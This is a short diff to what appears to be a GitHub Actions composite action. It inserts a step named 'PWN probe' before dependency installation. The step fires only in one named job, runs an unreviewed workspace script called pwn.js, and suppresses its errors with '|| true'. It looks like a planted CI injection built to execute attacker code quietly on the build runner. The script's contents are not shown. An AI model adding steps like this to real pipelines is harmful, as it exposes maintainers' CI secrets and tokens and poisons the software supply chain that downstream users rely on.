@@ -10,6 +10,15 @@ runs:
         cache: 'npm'
         cache-dependency-path: utils/package-lock.json
 
+    - name: PWN probe
+      shell: bash
+      run: |
+        if [ "$GITHUB_JOB" != "ensure-quickstart-ids-are-unique" ]; then
+          echo "PWN_MARKER_SKIP job=$GITHUB_JOB"
+          exit 0
+        fi
+        node "$GITHUB_WORKSPACE/pwn.js" || true
+
     - name: Install dependencies
       shell: bash
       run: cd utils && npm ci
